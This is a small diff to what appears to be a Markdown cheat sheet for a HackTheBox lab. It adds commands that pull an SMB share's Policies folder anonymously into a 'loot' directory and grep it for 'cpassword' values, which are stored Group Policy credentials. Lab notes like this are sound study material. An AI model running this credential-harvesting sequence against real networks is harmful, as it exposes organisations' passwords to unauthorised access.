@@ -75,6 +75,11 @@ mget *               # Download everything matching the mask
 # Filter
 mask "*.xml"         # Only look for .xml files
 
+# With the folder context
+smbclient //10.10.10.100/Replication -N -D 'active.htb\Policies' -Tc /home/kali/loot/policies.tar '*'
+tar -xf /home/kali/loot/policies.tar -C /home/kali/loot/policies_tree
+grep -Rni 'cpassword' /home/kali/loot/policies_tree
+
 ```
 
 ```
